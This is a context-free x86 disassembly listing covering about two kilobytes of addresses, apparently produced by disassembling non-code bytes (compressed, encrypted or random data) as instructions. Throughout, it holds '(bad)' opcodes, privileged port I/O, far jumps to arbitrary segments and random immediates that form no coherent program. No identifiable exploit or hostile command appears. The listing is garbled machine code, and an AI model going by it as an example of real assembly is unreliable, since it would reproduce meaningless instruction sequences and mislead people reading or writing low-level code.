  414c2e:	cmp    eax,0xc836c9c0
  414c33:	cmp    eax,0xb5d8a948
  414c38:	imul   esp,DWORD PTR [edx-0x2a],0x77fa1fa6
  414c3f:	ss mov dh,0x7c
  414c42:	adc    edx,DWORD PTR [esp+eiz*8-0x2962ef38]
  414c49:	mov    ch,0xdb
  414c4b:	jle    0x414be5
  414c4d:	clc    
  414c4e:	std    
  414c4f:	pop    esp
  414c50:	push   es
  414c51:	jg     0x414bfb
  414c53:	in     eax,dx
  414c54:	sub    DWORD PTR ds:0xaba530cc,esi
  414c5a:	dec    ebx
  414c5b:	xchg   ebp,eax
  414c5c:	mov    edx,cs
  414c5e:	mov    esi,0x810c5512
  414c63:	xlat   BYTE PTR ds:[ebx]
  414c64:	rcr    BYTE PTR [eax],0xb8
  414c67:	lea    ebx,[eax+esi*4-0x1cca012f]
  414c6e:	mov    ch,0xc4
  414c70:	and    eax,DWORD PTR [ebx+0x5]
  414c73:	xor    ebp,eax
  414c75:	add    al,0xd5
  414c77:	and    BYTE PTR [edi-0x40],dh
  414c7a:	(bad)  
  414c7c:	or     BYTE PTR [ebx-0x2250778e],al
  414c82:	outs   dx,BYTE PTR ds:[esi]
  414c83:	aas    
  414c84:	pop    ebp
  414c85:	mov    esi,0xcbbcd5d1
  414c8a:	add    eax,0xef04f5a7
  414c8f:	aad    0x47
  414c91:	cli    
  414c92:	add    BYTE PTR [edi+0xf],bh
  414c95:	and    BYTE PTR [ecx+0x74],ah
  414c98:	xor    eax,0xf669f24b
  414c9d:	leave  
  414c9e:	cwde   
  414c9f:	cmc    
  414ca0:	push   esi
  414ca1:	aaa    
  414ca2:	inc    ebp
  414ca3:	mov    esp,0x238152a6
  414ca8:	retf   
  414ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414caa:	imul   DWORD PTR [ecx-0x1681ce94]
  414cb0:	mov    dl,0xa4
  414cb2:	(bad)  [edi]
  414cb4:	jo     0x414cf0
  414cb6:	retf   
  414cb7:	push   ds
  414cb8:	pop    eax
  414cb9:	inc    edx
  414cba:	clc    
  414cbb:	add    al,0xe9
  414cbd:	in     al,dx
  414cbe:	mov    edx,0xb5505f8e
  414cc3:	jge    0x414cb6
  414cc5:	lods   al,BYTE PTR ds:[esi]
  414cc6:	lahf   
  414cc7:	retf   
  414cc8:	jmp    0x69b4:0xa58c12fe
  414ccf:	aam    0x39
  414cd1:	jecxz  0x414c84
  414cd3:	ret    
  414cd4:	sub    BYTE PTR [edi-0x785326fe],ch
  414cda:	pushf  
  414cdb:	xchg   ebx,eax
  414cdc:	push   edi
  414cdd:	rcr    BYTE PTR [edx-0x7],1
  414ce0:	sub    BYTE PTR [edi-0x694842bc],dh
  414ce6:	sub    BYTE PTR [ebp-0x40249b22],bl
  414cec:	nop
  414ced:	mov    DWORD PTR [ecx+0x52b5377c],esp
  414cf3:	repz push ds
  414cf5:	out    dx,eax
  414cf6:	pop    es
  414cf7:	or     BYTE PTR [ecx+0x4d],ah
  414cfa:	rcl    DWORD PTR [ecx],1
  414cfc:	ds iret 
  414cfe:	sbb    ebp,ecx
  414d00:	repz add BYTE PTR [eax+0x1c87a59f],0x2f
  414d08:	sbb    DWORD PTR [edi+ebp*8-0x35],ecx
  414d0c:	ins    BYTE PTR es:[edi],dx
  414d0d:	xchg   ebx,eax
  414d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d0f:	pushf  
  414d10:	scas   al,BYTE PTR es:[edi]
  414d11:	retf   0x3d8f
  414d14:	fist   WORD PTR [eax]
  414d16:	repnz mov cl,dh
  414d19:	int    0xf7
  414d1b:	inc    ecx
  414d1c:	(bad)  
  414d1d:	std    
  414d1e:	aad    0x85
  414d20:	sub    DWORD PTR [ecx-0x23aced21],ebx
  414d26:	add    bl,dl
  414d28:	lea    ebp,[ebx+ecx*8]
  414d2b:	mov    ecx,DWORD PTR [ebx-0x67]
  414d2e:	(bad)  
  414d2f:	sbb    esp,esp
  414d31:	sbb    dl,BYTE PTR [edi]
  414d33:	jl     0x414d1f
  414d35:	xchg   DWORD PTR [ebp+0x2cb73744],esp
  414d3b:	popf   
  414d3c:	xchg   edx,eax
  414d3d:	fsubr  st,st(5)
  414d3f:	xor    BYTE PTR [esi-0x31609ecf],ah
  414d45:	scas   eax,DWORD PTR es:[edi]
  414d46:	jge    0x414cdc
  414d48:	mov    eax,ds:0x7545cabf
  414d4d:	mov    cl,0x46
  414d4f:	xlat   BYTE PTR ds:[ebx]
  414d50:	pop    ebx
  414d51:	popf   
  414d52:	sub    ecx,DWORD PTR [ecx+ebp*1+0x5e68e3e1]
  414d59:	sbb    eax,0xc0a4b7ab
  414d5e:	ret    0xcea6
  414d61:	fnstsw ax
  414d63:	(bad)  
  414d64:	loopne 0x414d13
  414d66:	mov    bh,0x65
  414d68:	in     al,0xec
  414d6a:	loope  0x414d79
  414d6c:	pop    es
  414d6d:	sub    DWORD PTR [ecx-0x27],edi
  414d70:	js     0x414d2e
  414d72:	jg     0x414dd1
  414d74:	mov    eax,0x8beeceed
  414d79:	out    0x10,al
  414d7b:	les    ebp,FWORD PTR [esi-0x7b]
  414d7e:	rcr    BYTE PTR [edx-0x22888af],1
  414d84:	add    BYTE PTR [edx+0x2d],ah
  414d87:	fsub   st(4),st
  414d89:	das    
  414d8a:	cmp    edi,DWORD PTR [bp+si-0x1]
  414d8e:	xchg   esi,ebx
  414d90:	jmp    0x1951:0x7df6d5b2
  414d97:	iret   
  414d98:	call   0x3b6dc697
  414d9d:	imul   DWORD PTR [eax+esi*8]
  414da0:	add    dh,BYTE PTR [ebp-0x46f03c56]
  414da6:	pop    ss
  414da7:	dec    ebp
  414da8:	cmp    BYTE PTR [esi+0x740aca85],dh
  414dae:	adc    DWORD PTR [ecx+ebp*2+0x55db79c0],esp
  414db5:	lds    ebx,FWORD PTR [edx+0x50a77939]
  414dbb:	fwait
  414dbc:	ret    0xa9e0
  414dbf:	dec    ebx
  414dc0:	cmp    BYTE PTR [edi+0x76],cl
  414dc3:	retf   
  414dc4:	call   0xcd50a530
  414dc9:	gs jle 0x414d89
  414dcc:	mov    ds:0xab3ee361,eax
  414dd1:	cmp    eax,edi
  414dd3:	stos   DWORD PTR es:[edi],eax
  414dd4:	cs adc dh,cl
  414dd7:	popf   
  414dd8:	in     eax,dx
  414dd9:	outs   dx,DWORD PTR ds:[esi]
  414dda:	stos   BYTE PTR es:[edi],al
  414ddb:	jecxz  0x414d6d
  414ddd:	and    BYTE PTR [eax],al
  414ddf:	icebp  
  414de0:	pushf  
  414de1:	mov    bh,ah
  414de3:	mov    ch,0x36
  414de5:	bound  esi,QWORD PTR [ebp-0x6c9dd13b]
  414deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dec:	push   eax
  414ded:	cld    
  414dee:	jl     0x414db7
  414df0:	mov    esp,0xb6f570
  414df5:	ret    
  414df6:	fisub  WORD PTR [ecx]
  414df8:	push   0x458a8674
  414dfd:	js     0x414d83
  414dff:	cmp    bh,al
  414e01:	popf   
  414e02:	stos   BYTE PTR es:[edi],al
  414e03:	push   ebp
  414e04:	in     eax,dx
  414e05:	adc    ah,0x2a
  414e08:	pop    ecx
  414e09:	ins    BYTE PTR es:[edi],dx
  414e0a:	lea    edx,[edi+0x25]
  414e0d:	inc    BYTE PTR [ecx-0x357487b1]
  414e13:	push   esp
  414e14:	inc    esp
  414e15:	bound  esi,QWORD PTR [ecx-0x51]
  414e18:	dec    eax
  414e19:	xchg   ebp,eax
  414e1a:	out    dx,ax
  414e1c:	icebp  
  414e1d:	jns    0x414dc9
  414e1f:	xchg   esp,ecx
  414e21:	jg     0x414e83
  414e23:	maskmovq mm6,(bad)
  414e24:	div    DWORD PTR [ebx+ebx*1+0x67f9af6]
  414e2b:	dec    DWORD PTR [edx-0x18]
  414e2e:	xchg   ebx,eax
  414e2f:	xor    eax,0x15bc732c
  414e34:	fsubr  QWORD PTR [ebx-0x21065945]
  414e3a:	jg     0x414e65
  414e3c:	cld    
  414e3d:	adc    DWORD PTR ds:0xf004a199,ebx
  414e43:	adc    al,0x64
  414e45:	jg     0x414e43
  414e47:	adc    eax,0x9e01b874
  414e4c:	jmp    0xd6f26cc9
  414e51:	xchg   edx,eax
  414e52:	cmp    BYTE PTR [ecx],0x47
  414e55:	in     eax,dx
  414e56:	mov    al,0x8a
  414e58:	leave  
  414e59:	cmp    esi,esp
  414e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e5c:	push   esp
  414e5d:	mov    DWORD PTR [esi-0x45705ab4],ebx
  414e63:	fmul   DWORD PTR [edi]
  414e65:	je     0x414e0e
  414e67:	or     ebp,DWORD PTR [edx]
  414e69:	loopne 0x414df7
  414e6b:	lahf   
  414e6c:	adc    DWORD PTR [ebp-0xe],edx
  414e6f:	mov    ecx,0x8cd3fb7d
  414e74:	loop   0x414e5d
  414e76:	or     ecx,edi
  414e78:	fisub  WORD PTR [esp+edx*2-0xe2d3067]
  414e7f:	sbb    BYTE PTR [edi-0x38e53781],dh
  414e85:	leave  
  414e86:	(bad)  
  414e87:	clc    
  414e88:	out    dx,al
  414e89:	inc    ebx
  414e8a:	or     al,BYTE PTR [eax]
  414e8c:	push   es
  414e8d:	jp     0x414e13
  414e8f:	and    ecx,edi
  414e91:	jp     0x414ed9
  414e93:	mov    ecx,0x6a8b3104
  414e98:	ins    DWORD PTR es:[edi],dx
  414e99:	and    BYTE PTR [eax+0x7c],dh
  414e9c:	inc    edx
  414e9d:	ins    BYTE PTR es:[edi],dx
  414e9e:	pop    eax
  414e9f:	jb     0x414e38
  414ea1:	data16 mov ch,ah
  414ea4:	loope  0x414efb
  414ea6:	dec    eax
  414ea7:	adc    eax,DWORD PTR [ecx]
  414ea9:	add    bh,bh
  414eab:	imul   BYTE PTR cs:[ecx+esi*1+0x64]
  414eb0:	fucomp st(6)
  414eb2:	mov    dh,bh
  414eb4:	jne    0x414e68
  414eb6:	mov    fs,edx
  414eb8:	std    
  414eb9:	std    
  414eba:	pop    eax
  414ebb:	(bad)  
  414ebc:	push   ds
  414ebd:	push   cs
  414ebe:	clc    
  414ebf:	mov    WORD PTR [ebx-0x34],cs
  414ec2:	fadd   st,st(1)
  414ec4:	sahf   
  414ec5:	dec    ebx
  414ec6:	out    dx,al
  414ec7:	addr16 sub eax,0x1819a16f
  414ecd:	adc    al,0x25
  414ecf:	inc    ebx
  414ed0:	in     eax,dx
  414ed1:	dec    ecx
  414ed2:	mul    DWORD PTR [esp+eax*4+0x3c47198a]
  414ed9:	sbb    eax,0xfebb92fd
  414ede:	cs xchg ecx,eax
  414ee0:	xor    al,0x4
  414ee2:	sbb    al,0x8
  414ee4:	jg     0x414edf
  414ee6:	mov    ecx,DWORD PTR [ecx+0x18076653]
  414eec:	add    eax,0x4014b1fd
  414ef1:	cmp    DWORD PTR [ecx],0xffffffea
  414ef4:	mov    ch,0xdf
  414ef6:	les    ebx,FWORD PTR [edx+0xb]
  414ef9:	stos   DWORD PTR es:[edi],eax
  414efa:	cmp    ebp,edi
  414efc:	jno    0x414ed6
  414efe:	or     eax,0xf85e5df7
  414f03:	dec    ebp
  414f04:	stos   BYTE PTR es:[edi],al
  414f05:	scas   al,BYTE PTR es:[edi]
  414f06:	push   edi
  414f07:	icebp  
  414f08:	sbb    eax,DWORD PTR [ecx]
  414f0a:	gs cmp ebx,ecx
  414f0d:	test   BYTE PTR [eax-0xe12a2a6],dh
  414f13:	mov    al,ds:0xb74296ec
  414f18:	(bad)
  414f1c:	jo     0x414f4d
  414f1e:	arpl   cx,bx
  414f20:	xlat   BYTE PTR ds:[ebx]
  414f21:	(bad)  
  414f22:	call   0x9b02:0x5c27db0b
  414f29:	outs   dx,DWORD PTR ds:[esi]
  414f2a:	int    0xca
  414f2c:	ss xchg edx,eax
  414f2e:	pop    ss
  414f2f:	push   esi
  414f30:	gs aad 0xb
  414f33:	mov    ebx,0xbdceaf6f
  414f38:	xlat   BYTE PTR ds:[ebx]
  414f39:	ficom  WORD PTR [ebx]
  414f3b:	inc    ebp
  414f3c:	stos   DWORD PTR es:[edi],eax
  414f3d:	push   edi
  414f3e:	out    dx,al
  414f3f:	ja     0x414f49
  414f41:	dec    ebx
  414f42:	push   edi
  414f43:	sbb    al,0x81
  414f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f46:	test   DWORD PTR [edi+0x3af9fd31],0xd89d4677
  414f50:	jb     0x414f20
  414f52:	pop    edi
  414f53:	adc    eax,0x4787b2a5
  414f58:	lods   al,BYTE PTR ds:[esi]
  414f59:	xchg   DWORD PTR [edi],eax
  414f5b:	cmp    DWORD PTR [ebp-0x767f956a],ebx
  414f61:	push   ss
  414f62:	cmp    eax,0x553808e1
  414f67:	push   esi
  414f68:	scas   al,BYTE PTR es:[edi]
  414f69:	and    DWORD PTR [edx+0x558a8a0a],esp
  414f6f:	in     eax,0xee
  414f71:	xor    eax,0x578d6059
  414f76:	jno    0x414f66
  414f78:	inc    ecx
  414f79:	scas   al,BYTE PTR es:[edi]
  414f7a:	test   al,0xaf
  414f7c:	push   0x7e
  414f7e:	aas    
  414f7f:	lea    esp,[esp+ebx*1+0x5e]
  414f83:	out    dx,al
  414f84:	dec    edi
  414f85:	dec    eax
  414f86:	sar    DWORD PTR ds:0x220aab1b,1
  414f8c:	(bad)  
  414f8d:	test   cl,0x4c
  414f90:	jbe    0x414ffd
  414f92:	adc    eax,0xf60dea1e
  414f97:	aam    0x58
  414f99:	retf   0x5f65
  414f9c:	rcl    BYTE PTR [edx-0x6770414],cl
  414fa2:	shl    DWORD PTR [esi],1
  414fa4:	adc    DWORD PTR [edi],eax
  414fa6:	cmp    ah,0xd2
  414fa9:	mov    edx,0x76f5b4f0
  414fae:	cld    
  414faf:	fs mov edi,0xc7f70f75
  414fb5:	dec    ecx
  414fb6:	jno    0x414fd6
  414fb8:	into   
  414fb9:	iret   
  414fba:	pusha  
  414fbb:	inc    edx
  414fbc:	add    cl,cl
  414fbe:	sbb    ah,BYTE PTR [edi]
  414fc0:	inc    ecx
  414fc1:	mov    dh,0x7e
  414fc3:	ror    BYTE PTR [ebx+0x58],0x3f
  414fc7:	dec    esi
  414fc8:	mov    ebp,0x6b61c24c
  414fcd:	pop    ecx
  414fce:	adc    bl,ah
  414fd0:	mov    edx,0xf7159748
  414fd5:	pop    ds
  414fd6:	imul   ecx,DWORD PTR [esi],0xffffffa6
  414fd9:	loop   0x414fb6
  414fdb:	test   eax,0xa196a73d
  414fe0:	push   edx
  414fe1:	push   ss
  414fe2:	out    0x5e,al
  414fe4:	and    ch,0x57
  414fe7:	inc    esi
  414fe8:	sbb    DWORD PTR [ebp-0x7a],ebx
  414feb:	gs push ebp
  414fed:	or     DWORD PTR [esi],ebp
  414fef:	mov    ebp,?
  414ff1:	cmc    
  414ff2:	adc    eax,0xa412c839
  414ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff8:	ficomp WORD PTR ds:0x539f8c55
  414ffe:	xlat   BYTE PTR ds:[ebx]
  414fff:	jbe    0x415066
  415001:	add    bl,bl
  415003:	out    dx,al
  415004:	mov    dl,0x1d
  415006:	jae    0x414fb0
  415008:	and    BYTE PTR [edx],ch
  41500a:	dec    ebp
  41500b:	fadd   DWORD PTR [esi+0x3]
  41500e:	xor    cl,al
  415010:	retf   
  415011:	xchg   ebx,eax
  415012:	jecxz  0x415001
  415014:	and    ah,bl
  415016:	fsub   QWORD PTR [ebx+edi*2]
  415019:	in     eax,dx
  41501a:	aad    0x74
  41501c:	jmp    0x849:0x6f3ddc4f
  415023:	hlt    
  415024:	jno    0x41501d
  415026:	mov    esp,0x7b587c66
  41502b:	xor    eax,edi
  41502d:	rol    cl,cl
  41502f:	xor    DWORD PTR [eax+0x2376b010],ecx
  415035:	rcr    BYTE PTR ds:0xae6d1a21,cl
  41503b:	pop    edi
  41503c:	lahf   
  41503d:	das    
  41503e:	jl     0x4150ac
  415040:	push   ds
  415041:	lds    ecx,FWORD PTR [edx+0x7e]
  415044:	mov    ebp,0x7f91c90f
  415049:	push   cs
  41504a:	add    eax,0xc538d97e
  41504f:	cwde   
  415050:	sti    
  415051:	pop    ebx
  415052:	in     al,0x12
  415054:	in     eax,dx
  415055:	xor    dl,ch
  415057:	xor    ch,ah
  415059:	rcl    ecx,cl
  41505b:	into   
  41505c:	lods   al,BYTE PTR ds:[esi]
  41505d:	sbb    esi,ecx
  41505f:	push   edi
  415060:	test   ebp,edi
  415062:	and    al,0x9b
  415064:	add    DWORD PTR ds:[esi+eiz*8-0x4055a936],ebx
  41506c:	jae    0x41500d
  41506e:	pop    ss
  41506f:	sbb    eax,0xc24bd9e9
  415074:	pop    esp
  415075:	outs   dx,DWORD PTR ds:[esi]
  415076:	push   eax
  415077:	dec    edx
  415078:	xchg   DWORD PTR ds:0xbf4b2852,ecx
  41507e:	(bad)  {k7}{z}
  415083:	sbb    al,BYTE PTR [ebp+0x4d]
  415086:	shl    BYTE PTR [di+0x37a5],0x9d
  41508c:	dec    edi
  41508d:	outs   dx,BYTE PTR ds:[esi]
  41508e:	or     DWORD PTR [edi],esp
  415090:	dec    ecx
  415091:	fwait
  415092:	pop    eax
  415093:	cmp    al,0x4
  415095:	add    ch,BYTE PTR [edi-0x5c]
  415098:	ficomp WORD PTR [ebp+0x6e]
  41509b:	addr16 jge 0x41509a
  41509e:	or     dh,BYTE PTR [ebp+0x1efab8fa]
  4150a4:	ds repz popa 
  4150a7:	adc    eax,0xd5a595b6
  4150ac:	push   ds
  4150ad:	scas   al,BYTE PTR es:[edi]
  4150ae:	repz fs or eax,0x6a4bfee8
  4150b5:	(bad)  
  4150b6:	sub    eax,0xf4cf7b53
  4150bb:	es ja  0x41511e
  4150be:	outs   dx,BYTE PTR ds:[esi]
  4150bf:	cmp    ah,BYTE PTR [ebp-0x4174e022]
  4150c5:	jmp    0x9586:0x287d21f3
  4150cc:	and    ch,BYTE PTR [ebx-0x5f]
  4150cf:	fidiv  WORD PTR [edx+0x27685e84]
  4150d5:	idiv   BYTE PTR [ecx-0x210e4237]
  4150db:	mov    al,ds:0xcc356cf6
  4150e0:	rol    BYTE PTR [edx+0x12bcc1a8],cl
  4150e6:	fisubr WORD PTR [eax-0x443d14d1]
  4150ec:	retf   0x1598
  4150ef:	mov    esi,0x83ce3fed
  4150f4:	add    BYTE PTR [edx-0x45],al
  4150f7:	inc    esp
  4150f8:	sub    dh,BYTE PTR [eax-0x7dd0786e]
  4150fe:	push   edx
  4150ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415100:	jmp    0x41515f
  415102:	push   es
  415103:	test   BYTE PTR [ecx+0x5e],dh
  415106:	jecxz  0x4150eb
  415108:	push   ecx
  415109:	jmp    0x2670:0xe7bbf96d
  415110:	hlt    
  415111:	pop    ebx
  415112:	adc    al,0xf1
  415114:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415116:	add    esi,edi
  415118:	ficom  DWORD PTR [ebp+0x6a5a79fb]
  41511e:	into   
  41511f:	push   ecx
  415120:	ror    DWORD PTR [edx],0xf7
  415123:	int    0xfa
  415125:	stc    
  415126:	mov    ds:0x82610880,eax
  41512b:	hlt    
  41512c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41512d:	(bad)  
  41512f:	les    edx,FWORD PTR ds:0x800dd8e1
  415135:	inc    eax
  415136:	pop    ecx
  415137:	inc    edi
  415138:	xchg   esi,eax
  415139:	ror    DWORD PTR [eax*8+0x262a4660],cl
  415140:	in     al,dx
  415141:	lods   al,BYTE PTR ds:[esi]
  415142:	cs scas al,BYTE PTR es:[edi]
  415144:	mov    al,ds:0xdecb2519
  415149:	mov    esi,0x3422eef0
  41514e:	push   ss
  41514f:	sub    eax,0x2102b3c6
  415154:	jo     0x4150d6
  415156:	pop    edx
  415157:	imul   BYTE PTR [eax-0x36]
  41515a:	cmp    al,0x4c
  41515c:	loope  0x41510d
  41515e:	clc    
  41515f:	mov    eax,0x67132b68
  415164:	add    DWORD PTR [ebx+0x2a],0x66
  415168:	mov    ah,al
  41516a:	retf   0xa6f9
  41516d:	pop    edi
  41516e:	xchg   ch,ch
  415170:	or     al,0xc9
  415172:	and    eax,0x2dacfdb9
  415177:	sbb    eax,0xb5bfdd7e
  41517c:	jb     0x41510f
  41517e:	dec    esp
  41517f:	shl    BYTE PTR [ebp-0x71],cl
  415182:	and    eax,0x81ae09d9
  415187:	faddp  st(2),st
  415189:	cld    
  41518a:	cdq    
  41518b:	mov    gs,WORD PTR [eax]
  41518d:	push   ss
  41518e:	pop    edi
  41518f:	scas   eax,DWORD PTR es:[edi]
  415190:	mov    eax,ds:0x18ebd704
  415195:	or     eax,0x12651261
  41519a:	aaa    
  41519b:	int3   
  41519c:	aad    0x0
  41519e:	(bad)  
  41519f:	aad    0x7c
  4151a1:	outs   dx,DWORD PTR ds:[esi]
  4151a2:	jle    0x41519b
  4151a4:	jmp    0x41517e
  4151a6:	in     eax,dx
  4151a7:	inc    ecx
  4151a8:	xor    ch,BYTE PTR [esi]
  4151aa:	dec    ebp
  4151ab:	push   esp
  4151ac:	aas    
  4151ad:	lods   eax,DWORD PTR ds:[esi]
  4151ae:	jns    0x41513a
  4151b0:	sub    ebp,DWORD PTR [ebp*1+0x5d75b9d3]
  4151b7:	and    al,0x3f
  4151b9:	add    eax,0x4f5711f5
  4151be:	pop    ebp
  4151bf:	nop
  4151c0:	dec    esp
  4151c1:	jg     0x415151
  4151c3:	or     esp,ebp
  4151c5:	popa   
  4151c6:	jle    0x4151a6
  4151c8:	je     0x4151c0
  4151ca:	mov    ebx,0x7bd20aca
  4151cf:	outs   dx,DWORD PTR ds:[esi]
  4151d0:	imul   esp,DWORD PTR [edi+ebx*1+0x27],0x4d
  4151d5:	dec    ecx
  4151d6:	xchg   esp,eax
  4151d7:	xor    al,0xc7
  4151d9:	xchg   ebp,eax
  4151da:	or     BYTE PTR [edx*8-0x56637986],dl
  4151e1:	jmp    0x95caf2d6
  4151e6:	sbb    DWORD PTR [edx],eax
  4151e8:	pop    ecx
  4151e9:	mov    al,0xd0
  4151eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ec:	pusha  
  4151ed:	arpl   WORD PTR [esi+0x49],bx
  4151f0:	sbb    BYTE PTR [ebx+edi*8+0x2f],ch
  4151f4:	pop    eax
  4151f5:	loopne 0x415262
  4151f7:	xor    eax,0x289faf03
  4151fc:	idiv   DWORD PTR [edx+0x32]
  4151ff:	pop    es
  415200:	repz inc esp
  415202:	les    esp,FWORD PTR [esi]
  415204:	mov    dl,0x0
  415206:	and    BYTE PTR [ebp+0x6a],0x4e
  41520a:	fsubr  QWORD PTR [ebp*2-0x23ff26d9]
  415211:	mov    eax,ds:0x12b24953
  415216:	aam    0x53
  415218:	cmp    DWORD PTR ds:[edx],0x42
  41521c:	mov    bh,0x0
  41521e:	and    DWORD PTR [eax-0x3],esi
  415221:	addr16 cmp dl,cl
  415224:	je     0x4151df
  415226:	cmp    al,0x93
  415228:	lods   al,BYTE PTR ds:[esi]
  415229:	fdiv   DWORD PTR [ebp*2-0x7985cef7]
  415230:	push   ecx
  415231:	mov    ah,0x83
  415233:	loopne 0x41527a
  415235:	stos   DWORD PTR es:[edi],eax
  415236:	pop    ebx
  415237:	in     eax,dx
  415238:	adc    DWORD PTR [ecx+0x3d8af879],edi
  41523e:	inc    edi
  41523f:	sub    al,0x6c
  415241:	push   ecx
  415242:	ret    0xa33e
  415245:	jmp    0x3b9a:0xca475f41
  41524c:	repz jecxz 0x41521e
  41524f:	xchg   DWORD PTR [esi],ecx
  415251:	sti    
  415252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415253:	shr    DWORD PTR [ebx],0x26
  415256:	push   ds
  415257:	mov    ch,0x6b
  415259:	jg     0x415274
  41525b:	mov    bl,0xf
  41525d:	xor    DWORD PTR [edi],ecx
  41525f:	scas   eax,DWORD PTR es:[edi]
  415260:	fs retf 0xdb38
  415264:	adc    esp,DWORD PTR [ecx]
  415266:	mov    ds:0x2e4d8a8a,eax
  41526b:	push   ebp
  41526c:	push   0x1d
  41526e:	popf   
  41526f:	ins    DWORD PTR es:[edi],dx
  415270:	jb     0x415233
  415272:	daa    
  415273:	sbb    eax,0xa6010480
  415278:	add    BYTE PTR [esi+0x22],cl
  41527b:	pop    esi
  41527c:	cwde   
  41527d:	mov    al,0xae
  41527f:	mov    esi,0xfd52c1ce
  415284:	mov    al,ds:0x9508e438
  415289:	and    esp,DWORD PTR [edx+0x49434859]
  41528f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415290:	icebp  
  415291:	add    eax,edx
  415293:	push   ss
  415294:	dec    edx
  415295:	loopne 0x4152d3
  415297:	dec    BYTE PTR fs:[edi+0x1214ef74]
  41529e:	xlat   BYTE PTR ds:[ebx]
  41529f:	aam    0x9b
  4152a1:	aam    0x34
  4152a3:	xor    DWORD PTR [edx-0x48582e81],eax
  4152a9:	add    eax,0xb77e6f33
  4152ae:	fsub   DWORD PTR [esi+eiz*1+0x7f]
  4152b2:	leave  
  4152b3:	stc    
  4152b4:	mov    al,0x39
  4152b6:	bound  ecx,QWORD PTR [edi+0x51f68033]
  4152bc:	call   0x21e3ec32
  4152c1:	repnz mov edx,0xffeea5af
  4152c7:	or     al,0x9c
  4152c9:	xchg   edi,eax
  4152ca:	or     eax,0x6fc5e03a
  4152cf:	pop    edx
  4152d0:	stos   DWORD PTR es:[edi],eax
  4152d1:	aad    0x62
  4152d3:	and    BYTE PTR [edx+0x61],bh
  4152d6:	mul    BYTE PTR [eax-0x4e]
  4152d9:	pop    edi
  4152da:	enter  0xc805,0x29
  4152de:	std    
  4152df:	sbb    DWORD PTR [eax+edx*1],edi
  4152e2:	mov    esp,DWORD PTR [ebp-0x51]
  4152e5:	mov    WORD PTR [ebx+0x4bdf0ab0],cs
  4152eb:	arpl   WORD PTR [eax+0x21],di
  4152ee:	hlt    
  4152ef:	xchg   esi,ebx
  4152f1:	pop    ecx
  4152f2:	or     BYTE PTR [ebx],bl
  4152f4:	lock cwde 
  4152f6:	sti    
  4152f7:	clc    
  4152f8:	mov    dh,0x7c
  4152fa:	(bad)  
  4152fb:	inc    eax
  4152fc:	out    dx,eax
  4152fd:	jl     0x41532c
  4152ff:	jae    0x4152c4
  415301:	adc    edi,ebx
  415303:	cmc    
  415304:	nop
  415305:	fsubr  DWORD PTR [esi-0x51]
  415308:	ret    
  415309:	mov    ah,0xde
  41530b:	add    eax,0x4620a488
  415310:	inc    eax
  415311:	test   eax,0xeeb23c77
  415316:	pop    ebp
  415317:	fcmove st,st(6)
  415319:	inc    esp
  41531a:	jb     0x4152fa
  41531c:	mov    cl,0x4f
  41531e:	add    eax,0xffffff94
  415321:	mov    eax,ds:0x5a07963c
  415326:	push   ebx
  415327:	jne    0x415322
  415329:	call   0x2cac:0x7c6f5aab
  415330:	call   0x4922:0x759a62b7
  415337:	(bad)  
  415339:	outs   dx,DWORD PTR ds:[esi]
  41533a:	jnp    0x415376
  41533c:	fild   WORD PTR [esi-0x7927ece2]
  415342:	and    al,0xb4
  415344:	enter  0x4119,0xb9
  415348:	adc    BYTE PTR [edi+ebp*1-0x1f501bc8],dh
  41534f:	adc    BYTE PTR [ebp+0x34],al
  415352:	xor    ch,BYTE PTR [ecx+0x5fcc93d2]
  415358:	cdq    
  415359:	in     eax,0x4b
  41535b:	xchg   esi,eax
  41535c:	jo     0x415323
  41535e:	pusha  
  41535f:	xchg   ecx,eax
  415360:	jne    0x4153c1
  415362:	mov    ?,WORD PTR [esi+0x7c]
  415365:	adc    esi,DWORD PTR [esi]
  415367:	lock jecxz 0x415303
  41536a:	inc    ebx
  41536b:	in     eax,dx
  41536c:	out    0x75,al
  41536e:	pop    eax
  41536f:	push   esi
  415370:	ret    0x16f7
  415373:	sahf   
  415374:	dec    BYTE PTR fs:[esi+edi*1]
  415378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415379:	xchg   edx,eax
  41537a:	dec    esi
  41537b:	test   BYTE PTR [edx+ebx*4-0x4b5da01],dh
  415382:	in     al,dx
  415383:	sbb    BYTE PTR [edx+0x4b4ec0ff],0x4
  41538a:	lds    edx,FWORD PTR [edi+0x33]
  41538d:	xor    BYTE PTR [edi+ebp*4-0x79],0xed
  415392:	shr    al,cl
  415394:	cli    
  415395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415396:	jbe    0x4153c9
  415398:	cli    
  415399:	int    0x4b
  41539b:	xor    dl,BYTE PTR [eax+ecx*2-0x65]
  41539f:	cmp    bl,BYTE PTR [ebp+0x4b855f02]
  4153a5:	out    dx,eax
  4153a6:	cld    
  4153a7:	xchg   ebp,eax
  4153a8:	jbe    0x415407
  4153aa:	ja     0x41534d
  4153ac:	inc    ebx
  4153ad:	pop    ds
  4153ae:	xor    BYTE PTR [edi+edx*4-0x3c205963],al
  4153b5:	and    BYTE PTR [eax+0x2],0xad
  4153b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ba:	sub    edx,DWORD PTR [esi-0x5da84646]
  4153c0:	out    dx,al
  4153c1:	psubd  mm2,QWORD PTR [edi-0xf]
  4153c5:	adc    ah,BYTE PTR [eax-0x66]
  4153c8:	adc    ah,BYTE PTR [ebx-0x6d]
  4153cb:	jno    0x4153a6
  4153cd:	xchg   esi,eax
  4153ce:	xor    ebp,ebp
  4153d0:	jb     0x41540f
  4153d2:	pusha  
  4153d3:	sub    DWORD PTR [edi+ebx*4+0xb],ebp
  4153d7:	js     0x4153bb
  4153d9:	pop    ds
  4153da:	in     eax,dx
